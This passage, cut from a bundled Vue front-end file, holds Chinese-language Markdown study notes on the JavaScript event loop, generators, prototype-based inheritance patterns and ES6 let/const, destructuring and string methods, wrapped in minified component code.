因为JavaScript的工作环境是一个典型的异步应用场景：充斥着各种ajax事件和浏览器事件。各个事件的触发时间和得到反馈的时间都不得而知，如果设计成同步语言，将会带来极差的浏览器使用体验。\r\n\t- 浏览器需要做的事情太多了，一手需要负责渲染，一手需要负责http请求，一手还需要执行JavaScript，将JavaScript设计成单线程不仅能够让浏览器更好地控制各个线程，同时对开发者来说也更简单。多线程涉及到锁，临界区，冲突解决的学习成本还是比较高的。\r\n\r\n### 【执行机制】JS执行机制与异步队列\r\n\r\n- Event Loop\r\n\r\n\t- 一个 Event Loop 中，可以有一个或者多个任务队列(task queue)，一个任务队列便是一系列有序任务(task)的集合；每个任务都有一个任务源(task source)，源自同一个任务源的 task 必须放到同一个任务队列，从不同源来的则被添加到不同队列。\r\n\r\n- 每一次循环tick，分为四个关键步骤\r\n\r\n\t- 在此次 tick 中选择最先进入队列的任务(oldest task)，如果有则执行(一次)\r\n\t- 检查是否存在 Microtasks，如果存在则不停地执行，直至清空 Microtasks Queue\r\n\t- 更新 render\r\n\t- 主线程重复执行上述步骤\r\n\r\n- 任务可分为 （macro）task 和 microtask 两类\r\n\r\n\t- 不同的API注册的异步任务会依次进入自身对应的队列中，然后等待 Event Loop 将它们依次压入执行栈中执行。\r\n\t- (marco)task主要包括\r\n\r\n\t\t- script(整体代码)、setTimeout、setInterval、I/O、UI交互事件、setImmediate(Node.js 环境)\r\n\r\n\t- microtask主要包含\r\n\r\n\t\t- Promise、MutaionObserver、process.nextTick(Node.js 环境)\r\n\r\n- 任务源\r\n\r\n\t- setTimeout/Promise 等API便是任务源，而进入任务队列的是他们指定的具体执行任务。来自不同任务源的任务会进入到不同的任务队列。其中setTimeout与setInterval是同源的。\r\n\r\n- 示例\r\n\r\n\t- 代码\r\n\r\n\t- 步骤\r\n\r\n\t\t- （1）事件循环从宏任务(macrotask)队列开始，这个时候，宏任务队列中，只有一个script(整体代码)任务；当遇到任务源(task source)时，则会先分发任务到对应的任务队列中去。\r\n\r\n\t\t- （2）然后遇到了 console 语句，直接输出 script start。输出之后，script 任务继续往下执行，遇到 setTimeout，其作为一个宏任务源，则会先将其任务分发到对应的队列中：\r\n\r\n\t\t- （3）script 任务继续往下执行，遇到 Promise 实例。Promise 构造函数中的第一个参数，是在 new 的时候执行，构造函数执行时，里面的参数进入执行栈执行；而后续的 .then 则会被分发到 microtask 的 Promise 队列中去。所以会先输出 promise1，然后执行 resolve，将 then1 分配到对应队列。\r\n\r\n构造函数继续往下执行，又碰到 setTimeout，然后将对应的任务分配到对应队列：\r\n\r\n\t\t- （4）script任务继续往下执行，最后只有一句输出了 script end，至此，全局任务就执行完毕了。\r\n\r\n根据上述，每次执行完一个宏任务之后，会去检查是否存在 Microtasks；如果有，则执行 Microtasks 直至清空 Microtask Queue。\r\n\r\n因而在script任务执行完毕之后，开始查找清空微任务队列。此时，微任务中，只有 Promise 队列中的一个任务 then1，因此直接执行就行了，执行结果输出 then1。当所有的 microtast 执行完毕之后，表示第一轮的循环就结束了。\r\n\r\n\t\t- （5）这个时候就得开始第二轮的循环。第二轮循环仍然从宏任务 macrotask开始。此时，有两个宏任务：timeout1 和 timeout2。\r\n\r\n取出 timeout1 执行，输出 timeout1。此时微任务队列中已经没有可执行的任务了，直接开始第三轮循环：\r\n\r\n\t\t- （6）第三轮循环依旧从宏任务队列开始。此时宏任务中只有一个 timeout2，取出直接输出即可。\r\n\r\n这个时候宏任务队列与微任务队列中都没有任务了，所以代码就不会再输出其他东西了。那么例子的输出结果就显而易见：\r\n\r\n- Promise的特殊情况\r\n\r\n\t- 代码\r\n\r\n\t- 结果\r\n\r\n\t\t- 4321\r\n\r\n\t- 为什么 t2 会先执行呢？理由如下：\r\n\r\n\t\t- 实践中要确保 onFulfilled 和 onRejected 方法异步执行，且应该在 then 方法被调用的那一轮事件循环之后的新执行栈中执行\r\n\t\t- Promise.resolve 方法允许调用时不带参数，直接返回一个resolved 状态的 Promise 对象。立即 resolved 的 Promise 对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。\r\n\r\n## 生成器\r\n\r\n### 打破完整运行\r\n\r\n- 一个假定：一个函数一旦开始执行,就会运行到结束,期间不会有其他代码能够打断它并插入其间\r\n- ES6 引入了一个新的函数类型,它并不符合这种运行到结 束的特性。这类新的函数被称为生成器\r\n- 生成器就是一类特殊的函数,可以一次或多次启动和停止,并不一定非得要完成\r\n- 除了能够接受参数并提供返回值之外,生成器甚至提供了更强大更引人注目的内建消息输 入输出能力\r\n- :每次构建一个 迭代器 ,实际上就隐式构建了生 成器的一个实例,通过这个 迭代器 来控制的是这个生成器实例\r\n\r\n### 生成器产生值\r\n\r\n- 迭代器 是一个定 义良好的接口, 用于从一个生产者一步步得到一系列值\r\n- 的一个术语是 iterable (可迭代),即指一个包含可以在迭代器的值上迭代的迭代器的对象\r\n- iterable 必须支持一个函数,其名称 是专门的 ES6 符号值 Symbol.iterator 。 调用这个函数时, 它会返回一个迭代器\r\n- 把生成器看作一个值的生产 者,我们通过迭代器接口的 next() 调用一次提取出一个值\r\n- for..of 循环的“异常结束”(也就是“提前终 止”),通常由 break 、 return 或者未捕获异常引起,会向生成器的迭代器发送一个信号使 其终止\r\n- 可以在外部通过 return(..) 手工终止生成器的迭代器实例\r\n\r\n###  异步迭代生成器\r\n\r\n- 异步作为实现细节抽象了出去,使得我们可以以同步顺序的形式追 踪流程控制\r\n- 不仅能够从异步函数调用得到看似同步的返回值,还 可以同步捕获来自这些异步函数调用的错误\r\n\r\n### 生成器 +Promise\r\n\r\n- 获得 Promise 和生成器最大效用的最自然的方法就 是 yield 出来一个 Promise, 然后通过这个 Promise 来控制生成器的迭代器\r\n- await 了一个 Promise, async 函数就会自动获知要做什么,它会暂停这个函数(就 像生成器一样),直到 Promise 决议\r\n- Promise 所有的并发能力在生成器 +Promise 方法中都可以使用\r\n- 使用生成器实现异步的方法的全部要点在于创建简单、顺序、看似同步的代码,将异步的 细节尽可能隐藏起来\r\n\r\n### 生成器委托\r\n\r\n- 从一个生成器调用另一个生成器,使用辅助函数 run()\r\n- yield 委托 的具体语法是: yield * __(注意多出来的 * )\r\n- yield 委托的主要目的是代码组织,以达到与普通函数调用的对称\r\n- 保持生成器分离有助于程序的可读性、可维护性和可调试性\r\n- yield 委托是如何不只用于迭代器控制工作,也用于双向消息传递工 作的呢\r\n- 错误和异常也是双向传递的\r\n-  异步委托\r\n\r\n\t- 调用 yield *function()\r\n\r\n- 递归委托\r\n\r\n\t- 使用 委托实现异步的生成器 递归 ,即一个 yield 委托到它自身的生成器\r\n\r\n### 生成器并发\r\n\r\n- 两个实例 都是各自的响应一回来就取得了数据, 然后每个实例再次 yield , 用于控制传递的目的\r\n- runAll(..) 的工具\r\n\r\n### 形实转换程序\r\n\r\n- JavaScript 中的 thunk 是指一个用于调用另外一个函数的函数,没有任何参数\r\n- 你用一个函数定义封装函数调用,包括需要的任何参数,来定义这个调用的执 行,那么这个封装函数就是一个形实转换程序之后在执行这个 thunk 时,最终就是调用 了原始的函数\r\n\r\n### ES6 之前的生成器\r\n\r\n- 手工转换\r\n\r\n\t- 生成器是如何 工作的推导练习\r\n\r\n- 自动转换\r\n\r\n\t- 自动把 ES6 生成器转化为前面小节中我们推导出来的 结果那样的生成器的代码\r\n\r\n## 混合对象“类”\r\n\r\n### 类理论\r\n\r\n- 数据结构：把数据以及和它相关的行为打包\r\n- 面向对象编程\r\n\r\n\t- 实例化\r\n\t- 继承\r\n\t- 多态\r\n\t- 多态\r\n\r\n### JavaScript中的 “ 类 ”\r\n\r\n-  JavaScript 只有一些近似类的语法元素（语法糖）\r\n\r\n### 类的机制\r\n\r\n- “类”和“实例”\r\n\r\n\t- 建筑蓝图和实际建筑\r\n\r\n- 类的继承\r\n\r\n\t- 继承通用 的特性并根据自身类别修改某些特性\r\n\r\n- 多态\r\n\r\n\t- 多态性取决于你是在哪个类的实例中引用它\r\n\r\n- 多重继承\r\n\r\n### 在继承或者实例化时JavaScript 的对象机制并不会 自动 执行复制行为，它们会被 关联起来\r\n\r\n## 继承\r\n\r\n### 【继承】JavaScript 各种继承方式优缺点对比\r\n\r\n- （1）原型对象\r\n\r\n\t- 1.无论什么时候，只要创建一个新函数，就会根据一组特定的规则为该函数创建一个 prototype 属性，这个属性指向函数的原型对象。默认情况下，所有原型对象都会自动获得一个 constructor（构造函数）属性，这个属性指向 prototype 属性所在的函数。\r\n\r\n\t- 2.当我们用构造函数创建一个实例时，也会为这个实例创建一个 __proto__ 属性，这个__proto__ 属性是一个指针指向构造函数的原型对象\r\n\r\n- （2）重写原型对象\r\n\r\n\t- 我们经常用一个包含所有属性和方法的对象字面量来重写整个原型对象\r\n\t- 如果将 Person.prototype 设置为一个新对象，而这个对象中没有constructor属性，这导致 constructor 属性不再指向 Person，而是指向 Object。\r\n\r\n\t- 所以如果 constructor 的值很重要，我们可以像下面这样特意将它设置回设置回适当的值\r\n\r\n- （3）原型链及原型链继承\r\n\r\n\t- 解释清楚\r\n\r\n\t\t- 每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针(constructor)，而实例都包含一个指向原型对象的内部指针(__proto__)。那么，假如我们让原型对象等于另一个类型的实例，结果会怎么样呢？显然，此时的原型对象将包含一个指向另一个原型的指针，相应地，另一个原型中也包含着一个指向另一个构造函数的指针。假如另一个原型又是另一个构造函数的实例，那么上述关系依然成立，如此层层递进，就构成了实例与原型的链条。这就是所谓的原型链的基本概念。\r\n\r\n\t- 例子\r\n\r\n\t\t- 理解\r\n\r\n\t\t\t- 上面的代码中Sub.prototype = new Super();通过创建Super的实例，并将该实例赋值给Sub.prototype来实现继承。此时存在于Super的实例和原型对象中的所有属性和方法，也都存在于Sub.prototype中。instanse的__proto__属性指向Sub的原型对象Sub.prototype，Sub原型对象的__proto__属性又指向Super的原型对象Super.prototype。\r\n\r\n\t- 1.原型链搜索机制\r\n\r\n\t\t- 当访问一个实例的属性时，首先会在该实例中搜索该属性。如果没有找到该属性，则会继续搜索实例的原型。在通过原型链继承的情况下，搜索过程就得以沿着原型链继续向上查找，直到找到该属性为止，或者搜索到最高级的原型链Object.prototype中，任然没有找到则返回undefined。就拿上面的例子来说，调用instance.getSuperValue()会经历三个搜索步骤：1）搜索实例；2）搜索Sub.prototype;3）搜索Super.prototype，最后一步才会找到该方法。在找不到属性或方法的情况下，搜索过程总是要一环一环地前行到原型链的末端才会停下。\r\n\r\n\t- 2.原型链继承的缺陷\r\n\r\n\t\t- 理解\r\n\r\n\t\t\t- 原型链继承最大的问题是来自包含引用类型值的原型。引用类型值的原型属性会被所有实例共享。而这正是为什么要在构造函数中，而不是原型对象中定义属性的原因。在通过原型来实现继承时，原型实际上会另一个类型的实例。于是，原先的实例属性也就顺理成章地变成了现在的原型属性了。\r\n\r\n\t\t- 例子\r\n\r\n\t\t\t- 解释\r\n\r\n\t\t\t\t- 上面的代码中，Super 构造函数定义了一个colors 属性，该属性是一个数组。Super 的每个实例都会有各自包含自己数组的colors 属性。当Sub 通过原型链继承了Super之后，Sub.prototype 就变成了Super 的一个实例，因此它也拥有了一个它自己的colors 属性。结果是所有的Sub 实例都会共享这一个colors 属性。\r\n\r\n\t\t- 原型链的第二个问题是没有办法在不影响所有对象实例的情况下，给超类的构造函数传递参数。\r\n\r\n- （4）构造函数继承（经典继承）\r\n\r\n\t- 理解\r\n\r\n\t\t- 即在子类构造函数的中调用父类构造函数，此时当构建一个子类实例时，此实例也会拥有父类实例的属性和方法。\r\n\r\n\t- 例子\r\n\r\n\t\t- 解释\r\n\r\n\t\t\t- 上面的代码，当构建Sub的实例时，也会调用Super 的构造函数，这样就会在新Sub对象上执行Super()函数中定义的所有对象初始化代码。结果，Sub 的每个实例就都会具有自己的colors 属性的副本了。\r\n\r\n\t- 构造函数继承的缺陷\r\n\r\n\t\t- 如果仅仅是借用构造函数，那么也将无法避免构造函数模式存在的问题——方法都在构造函数中定义，因此函数服用就无从谈起。而且，在超类原型中定义的方法，对子类而已也是不可见的。\r\n\r\n- （5）组合继承\r\n\r\n\t- 原理\r\n\r\n\t\t- 是指将原型链和构造函数的相结合，发挥二者之长的一种继承模式。其思路是使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承。这样，即通过在原型上定义方法实现了函数复用，又能够保证每个实例都有它自己的属性。\r\n\r\n\t- 例子\r\n\r\n\t\t- 解释\r\n\r\n\t\t\t- 在上面的例子中，Sup构造函数定义了两个属性：name和colors。Sup的原型定义了一个方法sayName()。Sub构造函数在调用Sup构造函数时传入了name参数，紧接着又定义了它自己的属性age。然后，将Sup的实例赋值给Sub的原型，然后又在该新原型上定义了sayAge()方法。这样就可以让两个不同的Sub 实例即分别拥有自己的属性————包括colors 属性，又可以使用相同的方法了。\r\n\t\t\t- 组合继承避免了原型链和构造函数的缺陷，融合了它们的优点，是JavaScript中最常用的继承模式。\r\n\r\n\t- 美中不足\r\n\r\n\t\t- 上面的代码中调用了两次父类构造函数。Sub.prototype = new Super(); 第一次调用父类构造函数时，将Sup父类构造函数的实例赋值给了Sub子类的原型对象Sub.prototype。此时也会将父类构造函数实例上的属性赋值给子类的原型对象Sub.prototype。而第二次是在子类的构造函数中调用父类的构造函数 Super.call(this)，此时会将父类构造函数实例上的属性赋值给子类的构造函数的实例。根据原型链搜索原则，实例上的属性会屏蔽原型链上的属性。因此我们没有必要将父类构造函数实例的属性赋值给子类的原型对象，这是浪费资源而又没有意义的行为。\r\n\r\n- （6）优化后的组合继承\r\n\r\n\t- 例子一\r\n\r\n\t\t- 解释\r\n\r\n\t\t\t- 上面的例子通过将父类的原型对象直接赋值给一个中间构造函数的原型对象，然后将这个中间构造函数的实例赋值给子类的原型对象Sub.prototype，从而完成原型链继承。它的高效性体现在只调用了一个父类构造函数Super，并且原型链保持不变。\r\n\r\n\t- 例子二\r\n\r\n\t\t- 解释\r\n\r\n\t\t\t- 还有一种简便的写法是采用ES5的Object.create()方法来替代中间构造函数，其实原理都是一样的\r\n\r\n- （7）更简单的继承方式\r\n\r\n\t- 简要理解\r\n\r\n\t\t- 直接将子类的原型对象(prototype)上的__proto__指向父类的的原型对象(prototype)，这种方式没有改变子类的原型对象，所\b以子类原型对象\b上的constructor属性还是\b指向子类的构造函数，而且当子类的实例在子类的原型对象上没有搜索到\b对应的属性或方法时，它会通过子类原型对象上的__proto__属性，继续在父类的\b原型对象上搜索对应的属性或方法\r\n\r\n\t- 例子\r\n\r\n- （8）Object.setPrototypeOf()\r\n\r\n\t- 理解\r\n\r\n\t\t- Object.setPrototypeOf()是ECMAScript 6最新草案中的方法，相对于 Object.prototype.proto ，它被认为是修改对象原型更合适的方法\r\n\r\n\t- 例子\r\n\r\n- （9）类的静态方法继承\r\n\r\n\t- 理解\r\n\r\n\t\t- 上面所有的继承方法都没有实现类的静态方法继承，而在ES6的class继承中，子类是可以继承父类的静态方法的。我们可通过Object.setPrototypeOf()来实现类的静态方法继承，非常简单\r\n\r\n\t- 例子\r\n\r\n### JavaScript8种继承方式\r\n\r\n- 继承需要实现两点\r\n\r\n\t- 父类实例上的属性和方法\r\n\t- 父类原型对象上的属性和方法\r\n\r\n- 原型链继承\r\n\r\n\t- 关键代码\r\n\r\n\t\t- p = new Parent('father');\r\n\t\t- Child.prototype = p;\r\n\r\n\t- 优点\r\n\r\n\t\t- 可以调用原型链上的方法\r\n\t\t- 可以获取父类实例的属性\r\n\t\t- 可以直接修改父类实例属性\r\n\t\t- 可以通过子类实例修改父类上的引用类型\r\n\r\n\t- 缺点\r\n\r\n\t\t- 修改父类实例属性，所有原型链上的对象的属性都会被影响\r\n\t\t- 修改父类实例引用类型，其他对象也会受影响\r\n\t\t- 调用子类构造函数时，不能像父类构造函数传递参数\r\n\r\n- 借用构造函数继承\r\n\r\n\t- 关键代码\r\n\r\n\t\t- function Child(name) {\r\n  Parent.call(this, name)\r\n}\r\n\r\n\t- 关键思路\r\n\r\n\t\t- 把本来父类构造函数中指向父类实例的this，通过在子类构造函数中call(this)把上下文修改为子类实例。也就是把父类实例的属性复制一份给子类实例\r\n\r\n\t- 优点\r\n\r\n\t\t- 可以在call()中向父类构造函数传递参数\r\n\t\t- 可以访问父类实例上的属性，但是是自己的，并不是._proto_指向的。\r\n\t\t- 修改父类属性不会影响其他子类实例\r\n\r\n\t- 缺点\r\n\r\n\t\t- 因为没有原型链，所以子类实例实际上是不能访问到父类原型对象上的属性和方法\r\n\t\t- 每次创建一次实例都会创建一遍构造函数的方法\r\n\t\t- 方法都在构造函数中定义，因此，函数的复用就无从谈起。\r\n\r\n- 组合继承\r\n\r\n\t- 关键代码\r\n\r\n\t\t- 1.借用构造函数\r\n\r\n\t\t\t- function Child1(name) {\r\n  Father.call(this, name)\r\n  // 注意，要先 call 父构造函数，再定义子类实例自己的属性\r\n  // 否则子类实例属性会被父类实例同名属性覆盖\r\n  this.age = 10\r\n}\r\n\r\n\r\n\t\t- 2.添加原型链\r\n\r\n\t\t\t- \r\n// 修改原型对象\r\nChild1.prototype = f\r\n// 修改原型对象的构造函数\r\nChild1.prototype.constructor = Child1\r\n\r\n\t- 关键思想\r\n\r\n\t\t- 复制一份父类实例的属性到子类实例上\r\n\t\t- 将子类实例添加到原型链上\r\n\r\n\t- 优点\r\n\r\n\t\t- 可以向父类构造函数传参\r\n\t\t- 可以通过原型链访问父类属性\r\n\t\t- 可以修改父类属性而不影响其他子类实例\r\n\r\n\t- 缺点\r\n\r\n\t\t- 会调用两次父构造函数。\r\n\t\t- 一个子类实例将会持有两份父类实例的数据。\r\n\r\n- 原型式继承\r\n\r\n\t- 关键思想\r\n\r\n\t\t- 比较原型链继承\r\n\r\n\t\t\t- 原型链继承，是先在子类构造函数定义好了实例属性，再new一个父类实例，把子类构造函数的原型指向该实例\r\n\t\t\t- 原型式继承，已经有了一个父类实例，最后也同样把子类构造函数的原型指向该实例，只不过在中间定义子类构造函数的时候，定义了一个空的函数\r\n\r\n\t- 关键代码\r\n\r\n\t\t- 通过Object.create()来创建子类实例\r\n\r\n\t\t\t- // 为一个对象生成子类实例的函数。其实 Object.create() 就是这样实现的\r\nfunction object(obj){\r\n  // 传入的参数 obj 就相当于是父类实例\r\n  // F 就相当于子类构造函数，不过是空的，啥也没\r\n  function F(){}\r\n  // 把子类构造函数的原型对象设置为父类实例\r\n  F.prototype = obj\r\n  // 调用子类构造函数，创建一个实例并返回\r\n  return new F()\r\n}\r\n\t\t\t- // 为一个对象生成子类实例的函数。其实 Object.create() 就是这样实现的\r\nfunction object(obj){\r\n  // 传入的参数 obj 就相当于是父类实例\r\n  // F 就相当于子类构造函数，不过是空的，啥也没\r\n  function F(){}\r\n  // 把子类构造函数的原型对象设置为父类实例\r\n  F.prototype = obj\r\n  // 调用子类构造函数，创建一个实例并返回\r\n  return new F()\r\n}\r\n\r\n\t- 缺点\r\n\r\n\t\t- 子类修改引用类型，父类的引用属性也会改变\r\n\r\n\t- 优点\r\n\r\n\t\t- 与原型链继承最大的区别就是在定义子类构造函数的时候定义了一个空函数\r\n\t\t- 在没有必要兴师动众地创建构造函数，而只想让一个对象与另一个对象保持类似的情况下，原型式继承是完全可以胜任的。\r\n\r\n- 混入式继承mixin\r\n\r\n\t- 说白了就是把一个对象的属性复制到另一个对象上去。\r\n\t- 通过混入的方式为子类实例添加父类原型对象的属性\r\n\r\n\t\t- // 创建一个没有实例属性的 Mother 的实例\r\nm = Object.create(Mother.prototype)\r\n// 修改 Me 的原型对象，现在 Me 位于 Mother 实例的原型链上了\r\nMe.prototype = m\r\n// 修改构造函数\r\nMe.prototype.constructor = Me\r\n// 再把 Father 原型对象上的属性方法复制到 Me 的原型对象 m 上\r\n// 现在，虽然 Me 的实例并不在 Father 实例的原型链上\r\n// 但是也可以访问 Father.prototype 上的属性方法\r\nObject.assign(Me.prototype, Father.prototype)\r\n\r\nme = new Me()\r\nconsole.log(me)\r\n\r\n- ES6 extends\r\n\r\n\t- 实现思路和寄生组合继承是一样的\r\n\r\n- 寄生组合式继承\r\n\r\n\t- 关键思路\r\n\r\n\t\t- 利用Object.create()的“使用现有的对象来提供新建对象的_proto_”特性，来消除组合式继承的子类具有两份父类属性的缺点\r\n\t\t- 这两份数据中，通过 Father.call(this) 复制到子类实例 c 上的这一份是真正需要的，而 c.__proto__ 上的这一份是多余的，是把子类实例放到原型链上时产生的副作用。\r\n\t\t- 让子类实例在原型链上，但是不能让父类实例的属性位于原型链上\r\n\r\n\t- 关键代码\r\n\r\n\t\t- function Parent(name) {\r\n  this.name = name\r\n  this.age = 40\r\n  this.relation = ['grandma', 'grandpa']\r\n}\r\nParent.prototype.say = function () {\r\n  console.log(this.name)\r\n}\r\nfunction Child(name) {\r\n  Parent.call(this, name)\r\n}\r\n\r\n// 开始实现继承\r\n// Object.create 创建没有实例属性的父类实例\r\np = Object.create(Parent.prototype)\r\n// 修改子类构造函数原型对象\r\nChild.prototype = p\r\n// 这里的 p 只是个普通对象，没有 constructor 属性，手动添加一下\r\np.constructor = Child\r\n\r\n- 寄生式继承\r\n\r\n\t- 关键思路\r\n\r\n\t\t- 在原型式继承生成子类实例后，在返回之前处理了子类实例，增加了一些属性或方法\r\n\r\n\t- 代码\r\n\r\n\t\t- 关键代码\r\n\r\n\t\t\t- function createAnother(original){\r\n  // 使用前面的 object 函数，生成了一个子类实例\r\n  var clone = object(original)\r\n  // 先在子类实例上添加一点属性或方法\r\n  clone.sayHi = function(){\r\n    console.log(\"hi\")\r\n  }\r\n  // 再返回\r\n  return clone\r\n}\r\n\r\n### 行为委托（原型继承）\r\n\r\n- 面向委托（原型）的设计\r\n\r\n\t- JavaScript中这个机制（原型继承）的本质就是 对象之间的关联关系 。\r\n\t- 关联风格\r\n\r\n\t\t- 委托中最好把状态保存在委托者（原型）上\r\n\t\t- 避免在原型链的不同级别中使用相同的命名\r\n\t\t- 静止相互委托\r\n\r\n- 类与对象\r\n\r\n\t- 传统的类与对象的开发，需要在父类中定义基础方，然后在子类中重写（丑陋的伪多态）\r\n\t- 委托控件，在对象之间建立关联，定义不同的具有描述性的方法名\r\n\r\n- 提升\r\n\r\n\t- 更简洁的设计\r\n\r\n\t- 内省\r\n\r\n\t\t- 自省就是检查实例的类型\r\n\r\n",Zr={data:function(){return{MainComponent:Yr}}},nt=Zr,rt=Object(u["a"])(nt,Kr,Xr,!1,null,"1bd0ab0c",null),tt=rt.exports,et=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},at=[],it="# es6\r\n\r\n## let 和 const 命令\r\n\r\n### let 命令\r\n\r\n- 声明的变量，只在let命令所在的代码块内有效\r\n- for循环的计数器，就很合适使用let命令\r\n- let命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错\r\n- 只要块级作用域内存在let命令，它所声明的变量就“绑定”（binding）这个区域，不再受外部的影响\r\n- 如果区块中存在let和const命令，这个区块对这些命令声明的变量，从一开始就形成了封闭作用域\r\n- “暂时性死区”也意味着typeof不再是一个百分之百安全的操作\r\n- let不允许在相同作用域内，重复声明同一个变量\r\n- ES6 引入了块级作用域，明确允许在块级作用域之中声明函数\r\n\r\n### const 命令\r\n\r\n- const声明一个只读的常量。一旦声明，常量的值就不能改变\r\n- const一旦声明变量，就必须立即初始化，不能留到以后赋值\r\n- const的作用域与let命令相同：只在声明所在的块级作用域内有效\r\n- const命令声明的常量也是不提升，同样存在暂时性死区\r\n- const声明的常量，也与let一样不可重复声明\r\n- const实际上保证的，并不是变量的值不得改动，而是变量指向的那个内存地址不得改动。\r\n- ES5 只有两种声明变量的方法：var命令和function命令。ES6 除了添加let和const命令\r\n后面章节还会提到，另外两种声明变量的方法：import命令和class命令\r\n\r\n### 顶级对象属性\r\n\r\n- var命令和function命令声明的全局变量，依旧是顶层对象的属性；\r\n- 另一方面规定，let命令、const命令、class命令声明的全局变量，不属于顶层对象的属性\r\n\r\n## 变量的解构赋值\r\n\r\n### 数组的解构赋值\r\n\r\n- ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构\r\n- 本质上，这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值\r\n- 如果解构不成功，变量的值就等于undefined\r\n- 不完全解构，即等号左边的模式，只匹配一部分的等号右边的数组\r\n- 对于 Set 结构，也可以使用数组的解构赋值\r\n- 只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值\r\n- 解构赋值允许指定默认值\r\n\r\n\t- 只有当一个数组成员严格等于undefined，默认值才会生效\r\n\r\n- 默认值是一个表达式，那么这个表达式是惰性求值的，即只有在用到的时候，才会求值\r\n\r\n### 对象的解构赋值\r\n\r\n- 对象的属性没有次序，变量必须与属性同名，才能取到正确的值\r\n- 对象的解构赋值的内部机制，是先找到同名属性，然后再赋给对应的变量\r\n- 与数组一样，解构也可以用于嵌套结构的对象\r\n- 对象的解构也可以指定默认值\r\n\r\n\t- 默认值生效的条件是，对象的属性值严格等于undefined\r\n\r\n- 如果解构失败，变量的值等于undefined\r\n- 如果解构模式是嵌套的对象，而且子对象所在的父属性不存在，那么将会报错\r\n- 由于数组本质是特殊的对象，因此可以对数组进行对象属性的解构\r\n\r\n### 字符串的解构赋值\r\n\r\n- 字符串被转换成了一个类似数组的对象\r\n- 类似数组的对象都有一个length属性，因此还可以对这个属性解构赋值\r\n\r\n### 数值和布尔值的解构赋值\r\n\r\n- 解构赋值时，如果等号右边是数值和布尔值，则会先转为对象\r\n- 解构赋值的规则是，只要等号右边的值不是对象或数组，就先将其转为对象\r\n- 由于undefined和null无法转为对象，所以对它们进行解构赋值，都会报错\r\n\r\n### 函数参数的解构赋值\r\n\r\n- undefined就会触发函数参数的默认值\r\n\r\n### 圆括号问题\r\n\r\n- ES6 的规则是，只要有可能导致解构的歧义，就不得使用圆括号\r\n- 建议只要有可能，就不要在模式中放置圆括号\r\n- 可以使用圆括号的情况只有一种：赋值语句的非模式部分，可以使用圆括号。\r\n\r\n### 用途\r\n\r\n- 交换变量的值\r\n- 从函数返回多个值\r\n- 函数参数的定义\r\n- 提取 JSON 数据\r\n- 函数参数的默认值\r\n- 遍历 Map 结构\r\n- 输入模块的指定方法\r\n\r\n### 变量的结构赋值\r\n\r\n- 数组\r\n\r\n\t- 解析不成功值就是undefined\r\n\t- 不完全结构，结构依然可以成功\r\n\t- 不是可遍历结构报错\r\n\t- 允许指定默认值、===判断undefined时赋值\r\n\t- 按次序\r\n\r\n- 对象\r\n\r\n\t- 变量名必须与属性名同名\r\n\t- 解构失败时为undefined\r\n\t- 解构赋值可以取到继承的属性\r\n\t- 结构模式时嵌套的对象，子对象所在的父属性不存在，那么将会报错\r\n\t- 对象也可以指定默认值\r\n\t- 以申明的变量用于解构赋值要加圆括号\r\n\t- 数组时特殊的对象，因此可以对数组进行对象的属性的解构\r\n\r\n- 字符串\r\n\r\n\t- 字符串被转换成一个类似的数组对象\r\n\t- 有length属性，可以对这个属性赋值\r\n\r\n- 数值和布尔值\r\n\r\n\t- 如果等号右边是数值和布尔值，则会先转为对象\r\n\r\n\t\t- let {toString: s} = 123;\r\ns === Number.prototype.toString // true\r\n\t\t- let {toString: s} = true;\r\ns === Boolean.prototype.toString // true\r\n\r\n\t- 由于undefined和null无法转为对象，所以对它们进行解构赋值会报错\r\n\r\n- 函数参数\r\n- 圆括号\r\n\r\n\t- 不适用\r\n\r\n\t\t- 变量声明语句\r\n\t\t- 函数参数\r\n\t\t- 赋值语句的模式\r\n\r\n\t- 适用\r\n\r\n\t\t- 赋值语句的非模式部分\r\n\r\n- 用途\r\n\r\n\t- 交换变量的值\r\n\t- 从函数返回多个值\r\n\t- 函数参数的定义\r\n\t- 提取JSON数据\r\n\t- 函数参数的默认值\r\n\t- 遍历Map结构\r\n\r\n\t\t- let [key,value] of map\r\n\r\n\t- 输入模块的指定方法\r\n\r\n## 字符串的扩展\r\n\r\n### 字符的 Unicode 表示法\r\n\r\n- JavaScript 允许采用\\uxxxx形式表示一个字符，其中xxxx表示字符的 Unicode 码点\r\n- ES6 对这一点做出了改进，只要将码点放入大括号，就能正确解读该字符\r\n\r\n### codePointAt()\r\n\r\n- JavaScript 内部，字符以 UTF-16 的格式储存，每个字符固定为2个字节\r\n- 对于这种4个字节的字符，charAt方法无法读取整个字符，charCodeAt方法只能分别返回前两个字节和后两个字节的值\r\n- ES6 提供了codePointAt方法，能够正确处理 4 个字节储存的字符，返回一个字符的码点。\r\n- 对于那些两个字节储存的常规字符，它的返回结果与charCodeAt方法相同\r\n- codePointAt方法返回的是码点的十进制值，如果想要十六进制的值，可以使用toString方法转换一下\r\n\r\n### String.fromCodePoint()\r\n\r\n- ES5 提供String.fromCharCode方法，用于从码点返回对应字符，但是这个方法不能识别 32 位的 UTF-16 字符\r\n- ES6 提供了String.fromCodePoint方法，可以识别大于0xFFFF的字符，弥补了String.fromCharCode方法的不足\r\n- 如果String.fromCodePoint方法有多个参数，则它们会被合并成一个字符串返回\r\n\r\n### 字符串的遍历器接口\r\n\r\n- ES6 为字符串添加了遍历器接口，使得字符串可以被for...of循环遍历\r\n- 这个遍历器最大的优点是可以识别大于0xFFFF的码点，传统的for循环无法识别这样的码点\r\n\r\n### at()\r\n\r\n- ES5 对字符串对象提供charAt方法，返回字符串给定位置的字符。该方法不能识别码点大于0xFFFF的字符\r\n- 有一个提案，提出字符串实例的at方法，可以识别 Unicode 编号大于0xFFFF的字符，返回正确的字符\r\n\r\n### normalize()\r\n\r\n- ES6 提供字符串实例的normalize()方法，用来将字符的不同表示方法统一为同样的形式，这称为 Unicode 正规化\r\n\r\n### includes(), startsWith(), endsWith()\r\n\r\n- JavaScript 